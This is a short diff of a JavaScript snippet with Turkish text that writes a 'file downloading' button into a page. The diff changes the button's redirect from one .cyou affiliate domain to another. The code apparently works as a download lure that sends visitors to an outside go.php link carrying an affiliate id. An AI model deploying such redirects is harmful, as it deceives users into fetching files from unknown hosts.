@@ -31,8 +31,8 @@ var test  = function(){
 				document.getElementById('yenidosya_indir').style.backgroundImage = 'url("https://2.bp.blogspot.com/-TzusJxw0sYU/VsjLtPqAfNI/AAAAAAAAAAM/rdXhVrHTnM0/s1600/load.gif")';
 				document.getElementById('yenidosya_indir').innerHTML = 'Dosya indiriliyor lutfen bekleyin...';
 				// Ref
-				window.location.href = ' https://one2linefile.cyou/go.php?a_aid=55d467ad4dbf0&fn='+end+'';
+				window.location.href = ' https://pq106.cyou/go.php?a_aid=55d467ad4dbf0&fn='+end+'';
 			}
 
-var cont  = "<center><a title=\"indirmek icin tiklayiniz\" href=\"#\" id=\"yenidosya_indir\" onmouseover='this.style.backgroundColor = \"#598C4C\"' onmouseout='this.style.backgroundColor = \"#62AD54\"' onclick='window.open(\" https://one2linefile.cyou/go.php?a_aid=55d467ad4dbf0&fn="+end+"\", \"_blank\")'><img src=\"https://abload.de/img/indirbitonsngem0.png\" border=\"0\"></img></a></center>";
+var cont  = "<center><a title=\"indirmek icin tiklayiniz\" href=\"#\" id=\"yenidosya_indir\" onmouseover='this.style.backgroundColor = \"#598C4C\"' onmouseout='this.style.backgroundColor = \"#62AD54\"' onclick='window.open(\" https://pq106.cyou/go.php?a_aid=55d467ad4dbf0&fn="+end+"\", \"_blank\")'><img src=\"https://abload.de/img/indirbitonsngem0.png\" border=\"0\"></img></a></center>";
 			document.write(cont);
